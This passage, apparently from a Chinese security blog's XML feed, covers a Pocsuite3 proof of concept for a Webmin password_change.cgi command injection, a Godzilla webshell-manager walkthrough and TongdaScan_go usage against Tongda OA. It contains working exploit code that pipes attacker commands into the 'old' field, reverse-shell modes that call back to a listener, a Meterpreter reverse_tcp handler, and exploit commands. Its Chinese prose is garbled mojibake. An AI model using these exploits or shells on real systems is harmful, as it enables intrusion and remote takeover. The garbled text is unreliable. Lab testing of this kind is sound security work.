punctuation">}</span>            result<span class="token punctuation">[</span><span class="token string">'VerifyInfo'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'URL'</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>url            result<span class="token punctuation">[</span><span class="token string">'VerifyInfo'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>param<span class="token punctuation">]</span> <span class="token operator">=</span> res        <span class="token comment"># ç»Ÿä¸€è°ƒç”¨ self.parse_output() è¿”å›ç»“æœ</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>parse_output<span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token comment"># attack æ¨¡å¼çš„å®ç°</span>    <span class="token keyword">def</span> <span class="token function">_attack</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        <span class="token comment"># self.get_option() æ–¹æ³•å¯ä»¥è·å–è‡ªå®šä¹‰çš„å‘½ä»¤è¡Œå‚æ•°</span>        param <span class="token operator">=</span> self<span class="token punctuation">.</span>get_option<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span>        res <span class="token operator">=</span> self<span class="token punctuation">.</span>_exploit<span class="token punctuation">(</span>param<span class="token punctuation">)</span>        result<span class="token punctuation">[</span><span class="token string">'VerifyInfo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        result<span class="token punctuation">[</span><span class="token string">'VerifyInfo'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'URL'</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>url        result<span class="token punctuation">[</span><span class="token string">'VerifyInfo'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>param<span class="token punctuation">]</span> <span class="token operator">=</span> res        <span class="token comment"># ç»Ÿä¸€è°ƒç”¨ self.parse_output() è¿”å›ç»“æœ</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>parse_output<span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token comment"># shell æ¨¡å¼çš„å®ç°</span>    <span class="token keyword">def</span> <span class="token function">_shell</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>_exploit<span class="token punctuation">(</span>REVERSE_PAYLOAD<span class="token punctuation">.</span>BASH<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>get_listener_ip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_listener_port<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            <span class="token keyword">pass</span><span class="token comment"># å°†è¯¥ PoC æ³¨å†Œåˆ°æ¡†æ¶ã€‚</span>register_poc<span class="token punctuation">(</span>DemoPOC<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ä»¥ä¸Š PoC æ¨¡ç‰ˆçš„åŸºç¡€ä¸Šï¼Œç»“åˆæ¼æ´ç»†èŠ‚ï¼Œé‡å†™ <code>_exploit()</code> æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_exploit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> param<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>_check<span class="token punctuation">(</span>dork<span class="token operator">=</span><span class="token string">'&lt;title&gt;Login to Webmin&lt;/title&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>        <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>url<span class="token punctuation">}</span></span><span class="token string">/session_login.cgi'</span></span>    <span class="token punctuation">}</span>    payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'user=rootxx&amp;pam=&amp;expired=2&amp;old=test|</span><span class="token interpolation"><span class="token punctuation">{</span>param<span class="token punctuation">}</span></span><span class="token string">&amp;new1=test2&amp;new2=test2'</span></span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>url<span class="token punctuation">}</span></span><span class="token string">/password_change.cgi'</span></span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>    logger<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'The current password is incorrect'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;/h3&gt;&lt;/center&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå°±æ˜¯æ­å»º docker é¶åœºæµ‹è¯•äº†ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-it</span> <span class="token parameter variable">--rm</span> <span class="token parameter variable">-p</span> <span class="token number">10000</span>:10000 pocsuite3/cve-2019-15107<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>verify æ¨¡å¼ okï¼š</p><img src="/2025/01/20/gong-fang-gong-ju-ku/pocsuite/%E6%88%AA%E5%B1%8F2025-01-20%2018.13.36.png" style="zoom:50%;"><p>attack æ¨¡å¼è·å–å‘½ä»¤è¡Œå‚æ•°æ‰§è¡Œå¹¶è¿”å›ç»“æœï¼Œ<code>--options</code> å‚æ•°å¯ä»¥æŸ¥çœ‹ PoC å®šä¹‰çš„é¢å¤–å‘½ä»¤è¡Œå‚æ•°ï¼š</p><img src="/2025/01/20/gong-fang-gong-ju-ku/pocsuite/%E6%88%AA%E5%B1%8F2025-01-20%2018.15.15.png" style="zoom:50%;"><p>shell æ¨¡å¼ç”¨ bash çš„åè¿å›ä¸æ¥ï¼Œæœªæ·±ç©¶ï¼Œæ”¹ç”¨ python çš„å°±å¯ä»¥äº†ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºåè¿ payload å­˜åœ¨ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œéœ€è¦ç»“åˆæ¼æ´å…·ä½“æƒ…å†µå…·ä½“åˆ†æï¼Œæ¯”å¦‚ä½¿ç”¨ base64 ç¼–ç ç­‰ç»•è¿‡é™åˆ¶ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_shell</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>_exploit<span class="token punctuation">(</span>REVERSE_PAYLOAD<span class="token punctuation">.</span>BASH<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>get_listener_ip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_listener_port<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_exploit<span class="token punctuation">(</span>REVERSE_PAYLOAD<span class="token punctuation">.</span>PYTHON<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>get_listener_ip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_listener_port<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>shell æ¨¡å¼ okï¼š</p><img src="/2025/01/20/gong-fang-gong-ju-ku/pocsuite/%E6%88%AA%E5%B1%8F2025-01-20%2018.17.18.png" style="zoom:70%;"><h1 id="å®˜æ–¹æ–‡æ¡£"><a href="#å®˜æ–¹æ–‡æ¡£" class="headerlink" title="å®˜æ–¹æ–‡æ¡£"></a>å®˜æ–¹æ–‡æ¡£</h1><p><a href="https://pocsuite.org/guide/what-is-pocsuite3.html#%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7">https://pocsuite.org/guide/what-is-pocsuite3.html#%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7</a></p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²å·¥å…·åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”»é˜²å·¥å…·åº“ </tag>
            
            <tag> Pocsuite </tag>
            
            <tag> æ¸—é€æ¡†æ¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Godzilla</title>
      <link href="/2025/01/17/gong-fang-gong-ju-ku/godzilla/"/>
      <url>/2025/01/17/gong-fang-gong-ju-ku/godzilla/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€å“¥æ–¯æ‹‰ï¼ˆGodzillaï¼‰ä»‹ç»"><a href="#ä¸€ã€å“¥æ–¯æ‹‰ï¼ˆGodzillaï¼‰ä»‹ç»" class="headerlink" title="ä¸€ã€å“¥æ–¯æ‹‰ï¼ˆGodzillaï¼‰ä»‹ç»"></a>ä¸€ã€å“¥æ–¯æ‹‰ï¼ˆGodzillaï¼‰ä»‹ç»</h1><p>å“¥æ–¯æ‹‰ï¼ˆGodzillaï¼‰æ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„Webshellç®¡ç†å·¥å…·ï¼Œå®ƒæ”¯æŒå¤šç§ç±»å‹çš„Webshellï¼Œå¹¶ä¸”å…·å¤‡é€šä¿¡æµé‡åŠ å¯†çš„èƒ½åŠ›ã€‚è¯¥å·¥å…·ç”±Javaè¯­è¨€å¼€å‘ï¼Œå†…ç½®äº†3ç§Payloadä»¥åŠ6ç§åŠ å¯†å™¨ï¼Œæ”¯æŒ6ç§è„šæœ¬åç¼€ï¼Œå¹¶æä¾›äº†20ä¸ªå†…ç½®æ’ä»¶ã€‚å“¥æ–¯æ‹‰çš„shellèƒ½ç»•è¿‡å¸‚é¢ä¸Šå¤§éƒ¨åˆ†çš„é™æ€æŸ¥æ€ï¼Œå…¶æµé‡åŠ å¯†æªæ–½ä¹Ÿèƒ½ç»•è¿‡ç»å¤§éƒ¨åˆ†çš„æµé‡WAFã€‚æ­¤å¤–ï¼Œå“¥æ–¯æ‹‰è‡ªå¸¦çš„æ’ä»¶åŠŸèƒ½ä¸°å¯Œï¼ŒåŒ…æ‹¬å†…å­˜shellç®¡ç†ã€å±å¹•æˆªå›¾ã€è™šæ‹Ÿç»ˆç«¯ç­‰ï¼Œè¿™äº›åŠŸèƒ½æ˜¯å…¶ä»–å·¥å…·å¦‚å†°èã€èšå‰‘æ‰€ä¸èƒ½æ¯”æ‹Ÿçš„ã€‚</p><h1 id="äºŒã€å®‰è£…ä½¿ç”¨"><a href="#äºŒã€å®‰è£…ä½¿ç”¨" class="headerlink" title="äºŒã€å®‰è£…ä½¿ç”¨"></a>äºŒã€å®‰è£…ä½¿ç”¨</h1><p>åœ°å€ <a href="https://github.com/BeichenDream/Godzilla/releases/tag/v4.0.1-godzilla">https://github.com/BeichenDream/Godzilla/releases/tag/v4.0.1-godzilla</a> </p><img src="/2025/01/17/gong-fang-gong-ju-ku/godzilla/%E6%88%AA%E5%B1%8F2025-01-17%2011.07.59.png" style="zoom:50%;"><p>ä¸‹è½½jaråŒ…å°±è¡Œäº†ã€‚</p><p>è¿è¡Œç¯å¢ƒï¼š </p><ol><li>JavaDynamicPayload -&gt; java1.0åŠä»¥ä¸Š</li><li>CShapDynamicPayload -&gt; .net2.0åŠä»¥ä¸Š</li><li>PhpDynamicPayload -&gt; 4.3.0åŠä»¥ä¸Š</li><li>AspDynamicPayload -&gt; å…¨ç‰ˆæœ¬</li></ol><p>åŒå‡»jaråŒ…è¿è¡Œå³å¯ã€‚</p><h1 id="ä¸‰ã€å®æˆ˜ä½¿ç”¨"><a href="#ä¸‰ã€å®æˆ˜ä½¿ç”¨" class="headerlink" title="ä¸‰ã€å®æˆ˜ä½¿ç”¨"></a>ä¸‰ã€å®æˆ˜ä½¿ç”¨</h1><p>å‚è€ƒæœ¬ç«™ã€Šé€šè¾¾OAæ¼æ´æ¢æµ‹åŠåˆ©ç”¨ã€‹ä¸€æ–‡ã€‚</p><ul><li>æ¼æ´åˆ©ç”¨</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go run main.go exp <span class="token parameter variable">-u</span> http://192.168.52.30:8080/ <span class="token parameter variable">-i</span> Td03<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/17/gong-fang-gong-ju-ku/godzilla/%E6%88%AA%E5%B1%8F2025-01-17%2010.28.33.png" style="zoom:50%;"><img src="/2025/01/17/gong-fang-gong-ju-ku/godzilla/%E6%88%AA%E5%B1%8F2025-01-17%2010.52.50.png" style="zoom:50%;"><img src="/2025/01/17/gong-fang-gong-ju-ku/godzilla/%E6%88%AA%E5%B1%8F2025-01-17%2010.53.31.png" style="zoom:50%;"><p>æˆåŠŸgetshell!</p><ul><li>ä¸Šçº¿Meterpreter</li></ul><p>é€‰æ‹©PMeterpreteræ¨¡å—ï¼Œè®¾ç½®ä¸ºæ”»å‡»æœºçš„ipå’Œç›‘å¬ç«¯å£ã€‚</p><img src="/2025/01/17/gong-fang-gong-ju-ku/godzilla/%E6%88%AA%E5%B1%8F2025-01-17%2013.41.55.png" style="zoom:50%;"><p>æ”»å‡»æœºè®¾ç½®msf</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use exploit/multi/handler msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload php/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">&gt;</span> php/meterpreter/reverse_tcpmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lhost <span class="token number">0.0</span>.0.0lhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">0.0</span>.0.0msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lport <span class="token number">12345</span>lport <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">12345</span>msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/17/gong-fang-gong-ju-ku/godzilla/%E6%88%AA%E5%B1%8F2025-01-17%2013.44.34.png" style="zoom:50%;"><img src="/2025/01/17/gong-fang-gong-ju-ku/godzilla/%E6%88%AA%E5%B1%8F2025-01-17%2013.44.52.png" style="zoom:50%;">]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²å·¥å…·åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”»é˜²å·¥å…·åº“ </tag>
            
            <tag> webshellç®¡ç† </tag>
            
            <tag> å“¥æ–¯æ‹‰ </tag>
            
            <tag> Godzilla </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€šè¾¾OAæ¼æ´æ¢æµ‹åŠåˆ©ç”¨</title>
      <link href="/2025/01/17/gong-fang-gong-ju-ku/tong-da-oa-lou-dong-tan-ce-ji-li-yong/"/>
      <url>/2025/01/17/gong-fang-gong-ju-ku/tong-da-oa-lou-dong-tan-ce-ji-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€é€šè¾¾OAä»‹ç»"><a href="#ä¸€ã€é€šè¾¾OAä»‹ç»" class="headerlink" title="ä¸€ã€é€šè¾¾OAä»‹ç»"></a>ä¸€ã€é€šè¾¾OAä»‹ç»</h1><p>é€šè¾¾OAï¼Œå…¨ç§°ä¸ºOffice Anywhereç½‘ç»œæ™ºèƒ½åŠå…¬ç³»ç»Ÿï¼Œæ˜¯ç”±åŒ—äº¬é€šè¾¾ä¿¡ç§‘ç§‘æŠ€æœ‰é™å…¬å¸è‡ªä¸»ç ”å‘çš„ååŒåŠå…¬è‡ªåŠ¨åŒ–è½¯ä»¶ï¼Œæ˜¯ä¸ä¸­å›½ä¼ä¸šç®¡ç†å®è·µç›¸ç»“åˆå½¢æˆçš„ç»¼åˆç®¡ç†åŠå…¬å¹³å°ã€‚</p><ul><li>æ ¸å¿ƒåŠŸèƒ½ï¼š</li></ul><p>ç»Ÿä¸€é€šè®¯ï¼šæ”¯æŒç”µè„‘ã€æ‰‹æœºã€æµè§ˆå™¨ç­‰å¤šç»ˆç«¯ç»Ÿä¸€é€šè®¯ï¼ŒèŠå¤©è®°å½•äº‘åŒæ­¥ï¼Œæ”¯æŒå‘é€æ–‡ä»¶ã€å›¾ç‰‡ã€è¯­éŸ³ç­‰å½¢å¼ã€‚</p><p>ç”µå­é‚®ä»¶ï¼šç»Ÿä¸€é‚®ä»¶ç³»ç»Ÿï¼Œæ”¯æŒå†…å¤–ç½‘é‚®ä»¶æ”¶å‘ï¼Œå¹¶è¿›è¡Œç»Ÿä¸€ç®¡ç†ï¼Œæ”¯æŒé‚®ä»¶æ™ºèƒ½åˆ†ç±»å’Œå…³é”®è¯æå–ç­‰åŠŸèƒ½ã€‚</p><p>å…¬å‘Šé€šçŸ¥ï¼šä¼ä¸šç»Ÿä¸€ä¿¡æ¯å‘å¸ƒå¹³å°ï¼Œå›¾æ–‡å¹¶èŒ‚ï¼Œé…åˆæ¶ˆæ¯æé†’å°†ä¿¡æ¯å³æ—¶ä¼ è¾¾åˆ°æ¯ä½å‘˜å·¥ã€‚</p><p>è€ƒå‹¤æ‰“å¡ï¼šå¯è®¾ç½®ä¸åŒæ’ç­ç±»å‹å’Œè€ƒå‹¤ç±»å‹ï¼Œæ”¯æŒæ‰‹æœºè€ƒå‹¤æ‰“å¡ï¼Œå¯è®°å½•åœ°ç†ä½ç½®ï¼Œæˆ–é™å®šåœ¨å›ºå®šä½ç½®æˆ–Wifiä¸‹æ‰“å¡ã€‚</p><p>è¡Œæ”¿åŠå…¬ï¼šå®Œå–„çš„åŠå…¬ç”¨å“ã€ä¼šè®®å®¤ã€è½¦è¾†ç­‰è¡Œæ”¿ç®¡ç†åŠŸèƒ½ï¼Œé™ä½è¿è¥ç®¡ç†æˆæœ¬ï¼Œæå‡è¡Œæ”¿ç®¡ç†æ•ˆç‡ã€‚</p><p>ä»»åŠ¡ååŒï¼šæœ‰æ•ˆè§£å†³å›¢é˜Ÿåä½œé—®é¢˜ï¼Œä»»åŠ¡æ‹†è§£ã€åˆ†é…ï¼Œè´£ä»»æœ‰æ•ˆè½å®ï¼Œæ—¶é—´åŠ¨æ€ã€äº¤æµè®¨è®ºï¼Œæ•´ä½“ä»»åŠ¡è¿›åº¦ç›´è§‚å¯æ§ã€‚</p><p>æ•°æ®å®‰å…¨ï¼šæ”¯æŒç§æœ‰åŒ–éƒ¨ç½²å’Œäº‘éƒ¨ç½²ï¼Œæ‰€æœ‰æ•°æ®ç»Ÿä¸€å­˜å‚¨ï¼Œä¿éšœæ•°æ®å®‰å…¨ã€‚å…ˆè¿›çš„æŠ€æœ¯æ¶æ„å’Œå¼€å‘æ¶æ„ä¿éšœç³»ç»Ÿå®‰å…¨ã€‚</p><p>é›¶æˆæœ¬è¿ç»´ï¼šåº•å±‚æœåŠ¡è‡ªåŠ¨ç›‘æ§ï¼Œè‡ªæˆ‘ä¿®å¤æ•…éšœï¼Œä¿éšœç³»ç»Ÿå¥åº·è¿è¡Œã€‚æ•°æ®è‡ªåŠ¨å¤‡ä»½ï¼Œç³»ç»Ÿè‡ªåŠ¨å‡çº§ï¼Œå®ç°é›¶æˆæœ¬è¿ç»´ã€‚</p><p>æµç¨‹ä¸­å¿ƒï¼šé«˜æ•ˆçš„æµç¨‹å’Œå®¡æ‰¹ç³»ç»Ÿï¼Œè®©å„ç§ä¸šåŠ¡éƒ½èƒ½å¿«é€Ÿæµè½¬å®¡æ‰¹ã€‚</p><p>åº”ç”¨ä¸­å¿ƒï¼šç”¨æˆ·å¯è‡ªä¸»æ­å»ºè¿›é”€å­˜ç®¡ç†ã€åˆåŒç®¡ç†ã€ç”Ÿäº§ç®¡ç†ã€é¡¹ç›®ç®¡ç†ç­‰ä¸šåŠ¡ç³»ç»Ÿï¼Œè®©å¼€å‘æ›´ç®€å•ã€‚</p><p>æŠ¥è¡¨ä¸­å¿ƒï¼šä¸“ä¸šã€é€šç”¨ã€å®Œæ•´ã€å¼ºå¤§ã€æ˜“ç”¨çš„æŠ¥è¡¨å·¥å…·ï¼Œæä¾›æ•°æ®ç»Ÿè®¡ã€æ±‡æ€»ã€åˆ†æã€æ‰“å°ã€è¾“å‡ºã€é¢„è­¦ç­‰æ ¸å¿ƒåŠŸèƒ½ï¼ŒåŠ©åŠ›ä¼ä¸šæŒ–æ˜æ•°æ®ä»·å€¼ã€‚</p><p>ç§»åŠ¨åŠå…¬ï¼šæ¶ˆæ¯éšæ—¶å›ï¼Œæµç¨‹éšæ—¶åŠï¼Œæ”¯æŒä¸å¾®ä¿¡ã€é’‰é’‰é›†æˆï¼Œæ‰“é€ å…¨æ–°çš„åŠå…¬æ–¹å¼ã€‚</p><p>å…¬æ–‡ç®¡ç†ï¼šç»„ç»‡å•ä½ä¸Šä¼ ä¸‹è¾¾ï¼Œä¸€ä½“åŒ–è§„èŒƒç®¡ç†ï¼Œæ›´åˆè§„çš„å…¬æ–‡ç®¡ç†ã€‚</p><p>ç£æŸ¥ç£åŠï¼šå°†è®¡åˆ’ã€ç»„ç»‡ã€åè°ƒã€æ§åˆ¶ã€æ¿€åŠ±ç­‰ä¸ç£æŸ¥ç£åŠå·¥ä½œè¿‡ç¨‹å’Œè¦æ±‚ç›¸ç»“åˆï¼Œå®ç°çºµå‘åä½œã€å¼ºåŒ–ä»»åŠ¡æ‰§è¡ŒåŠ›ã€‚</p><h1 id="äºŒã€å†å²æ¼æ´æ¦‚è§ˆ"><a href="#äºŒã€å†å²æ¼æ´æ¦‚è§ˆ" class="headerlink" title="äºŒã€å†å²æ¼æ´æ¦‚è§ˆ"></a>äºŒã€å†å²æ¼æ´æ¦‚è§ˆ</h1><ul><li>é€šè¾¾OA v2014 get_contactlist.php æ•æ„Ÿä¿¡æ¯æ³„æ¼</li><li>é€šè¾¾OA v2017 video_file.php ä»»æ„æ–‡ä»¶ä¸‹è½½</li><li>é€šè¾¾OA v2017 action_upload.php ä»»æ„æ–‡ä»¶ä¸Šä¼ </li><li>é€šè¾¾OA v2017 login_code.php ä»»æ„ç”¨æˆ·ç™»å½•</li><li>é€šè¾¾OA v11 login_code.php ä»»æ„ç”¨æˆ·ç™»å½•</li><li>é€šè¾¾OA v11.5 swfupload_new.php SQLæ³¨å…¥</li><li>é€šè¾¾OA v11.6 report_bi.func.php SQLæ³¨å…¥</li><li>é€šè¾¾OA v11.8 api.ali.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´</li><li>é€šè¾¾OA v11.8 gateway.php è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´</li><li>é€šè¾¾OA v11.6 print.phpæœªæˆæƒåˆ é™¤auth.inc.phpå¯¼è‡´RCE</li><li>é€šè¾¾OA v11.10 getdata ä»»æ„æ–‡ä»¶ä¸Šä¼ </li></ul><h1 id="ä¸‰ã€TongdaScan-go-å·¥å…·"><a href="#ä¸‰ã€TongdaScan-go-å·¥å…·" class="headerlink" title="ä¸‰ã€TongdaScan_go å·¥å…·"></a>ä¸‰ã€TongdaScan_go å·¥å…·</h1><h2 id="3-1-å·¥å…·åœ°å€"><a href="#3-1-å·¥å…·åœ°å€" class="headerlink" title="3.1 å·¥å…·åœ°å€"></a>3.1 å·¥å…·åœ°å€</h2><p><a href="https://github.com/Fu5r0dah/TongdaScan_go">https://github.com/Fu5r0dah/TongdaScan_go</a></p><h2 id="3-2-ä½¿ç”¨æ–¹æ³•"><a href="#3-2-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="3.2 ä½¿ç”¨æ–¹æ³•"></a>3.2 ä½¿ç”¨æ–¹æ³•</h2><h3 id="3-2-1-æ¼æ´æ‰«æ"><a href="#3-2-1-æ¼æ´æ‰«æ" class="headerlink" title="3.2.1 æ¼æ´æ‰«æ"></a>3.2.1 æ¼æ´æ‰«æ</h3><p>ä½¿ç”¨scanå‚æ•°æ—¶ï¼Œä¸æŒ‡å®šä»»ä½•vulnIDï¼Œåˆ™è‡ªåŠ¨æ£€æµ‹æ‰€æœ‰æ¼æ´</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go run main.go scan <span class="token parameter variable">-u</span> http://1.1.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/17/gong-fang-gong-ju-ku/tong-da-oa-lou-dong-tan-ce-ji-li-yong/%E6%88%AA%E5%B1%8F2025-01-17%2009.33.32.png" style="zoom:50%;"><h3 id="3-2-2-æŒ‡å®šæ¼æ´ID"><a href="#3-2-2-æŒ‡å®šæ¼æ´ID" class="headerlink" title="3.2.2 æŒ‡å®šæ¼æ´ID"></a>3.2.2 æŒ‡å®šæ¼æ´ID</h3><pre class="line-numbers language-none"><code class="language-none">go run main.go scan -u http://1.1.1.1 -i Td03<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/17/gong-fang-gong-ju-ku/tong-da-oa-lou-dong-tan-ce-ji-li-yong/%E6%88%AA%E5%B1%8F2025-01-17%2009.34.57.png" style="zoom:50%;"><h3 id="3-2-3-æ¼æ´åˆ©ç”¨"><a href="#3-2-3-æ¼æ´åˆ©ç”¨" class="headerlink" title="3.2.3 æ¼æ´åˆ©ç”¨"></a>3.2.3 æ¼æ´åˆ©ç”¨</h3><img src="/2025/01/17/gong-fang-gong-ju-ku/tong-da-oa-lou-dong-tan-ce-ji-li-yong/%E6%88%AA%E5%B1%8F2025-01-17%2009.36.04.png" style="zoom:40%;"><pre class="line-numbers language-none"><code class="language-none">go run main.go exp -u http://1.1.1.1 -i Td03<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-4-ä»£ç†"><a href="#3-2-4-ä»£ç†" class="headerlink" title="3.2.4 ä»£ç†"></a>3.2.4 ä»£ç†</h3><pre class="line-numbers language-none"><code class="language-none">go run main.go scan -u http://1.1.1.1 -i Td01 -s http://127.0.0.1:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-3-å®æˆ˜æµ‹è¯•ä½¿ç”¨"><a href="#3-3-å®æˆ˜æµ‹è¯•ä½¿ç”¨" class="headerlink" title="3.3 å®æˆ˜æµ‹è¯•ä½¿ç”¨"></a>3.3 å®æˆ˜æµ‹è¯•ä½¿ç”¨</h2><h3 id="3-3-1-å¯åŠ¨è¿è¡Œ"><a href="#3-3-1-å¯åŠ¨è¿è¡Œ" class="headerlink" title="3.3.1 å¯åŠ¨è¿è¡Œ"></a>3.3.1 å¯åŠ¨è¿è¡Œ</h3><ul><li>kali</li></ul><img src="/2025/01/17/gong-fang-gong-ju-ku/tong-da-oa-lou-dong-tan-ce-ji-li-yong/%E6%88%AA%E5%B1%8F2025-01-17%2009.42.00.png" style="zoom:50%;"><p>å®‰è£…ç¬¬ä¸‰æ–¹åº“å¤±è´¥ã€‚éœ€è¦æŒ‚ä»£ç†å®‰è£…ã€‚</p><ul><li>mac</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go run main.go<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="å¤§æˆ˜bugï¼š"><a 